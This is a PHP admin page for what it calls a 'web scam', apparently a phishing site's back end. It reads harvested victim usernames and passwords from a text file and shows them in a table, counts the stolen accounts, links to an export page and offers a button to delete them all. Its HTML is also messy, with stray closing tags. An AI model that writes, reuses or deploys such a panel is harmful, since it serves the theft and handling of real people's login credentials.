<?php
include 'session.php';
(!isset($_SESSION['admin'])) ? die(header("Location: ad_login.php")) : false;
if (isset($_POST['del_all'])) {
	file_put_contents('admin.txt', "");
	 $sodong = basename('admin.txt'); 
	  die(header("Location: /admin.php"));
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Quản trị web scam</title>
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css" integrity="sha384-zCbKRCUGaJDkqS1kPbPd7TveP5iyJE0EjAuZQTgFLD2ylzuqKfdKlfG/eSrtxUkn" crossorigin="anonymous">
	 <!-- Theme style -->
	<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-fQybjgWLrvvRgtW6bFlB7jaZrFsaBXjsOMm/tB9LTS58ONXgqbR9W8oWht/amnpF" crossorigin="anonymous"></script>
</head>
<body>
                </div>
            </div>
        </nav>
    </div>
          	<div class="container mt-4">
		<form method="post">
			<button class="btn btn-danger float-right mb-4" type="submit" name="del_all">Xóa hết tài khoản</button>
		</form>
          </div>
		
			<div class="container mt-4">
            <a class="btn btn-danger float-right mb-4" href="xuatfileacc.php">XUẤT FILE ACC</a>
            </tr>
             <div class="container mt-4">
            <a class="btn btn-danger float-right mb-4" href="/">Trang Chủ</a>
            </tr>
	    		<?php
        $file = basename('admin.txt');   
		$so_dong = count(file($file));   
		echo "Tổng $so_dong acc"."<br>";
       ?>
	    		</tr>
          </div>
			</form>
		<div class="table-responsive">
			<table class="table table-hover">
				    </div>
              <th>Tài Khoản</th>
					<th>Mật Khẩu</th>
            
           </div>
       </div>
    </div>

</div>

		<div class="table-responsive">
			<table class="table table-hover">
					<?php
					$contents = file_get_contents('admin.txt');
					foreach (explode(PHP_EOL, $contents) as $Contents_for):
						?>
						<tr>
							<td><?=explode('|', $Contents_for)[0]?></td>
							<td><?=(isset(explode('|', $Contents_for)[1])) ? explode('|', $Contents_for)[1] : false?></td>
						</tr>
						<?php
					endforeach;
					?>
				</tbody>
			</table>
		</div>
		<script type='text/javascript'>
     function doDownload(str) {
              function dataUrl(data) {
                return "data:x-application/xml;charset=utf-8," + escape(data);
              }
              var downloadLink = document.createElement("a");
              downloadLink.href = dataUrl(str);
              downloadLink.download = "sc0m.txt";

              document.body.appendChild(downloadLink);
              downloadLink.click();
              document.body.removeChild(downloadLink);
            }
</script>
		<p class="text-center">&copy; Quản Trị Viên</p>
	</div>
</body>
</html>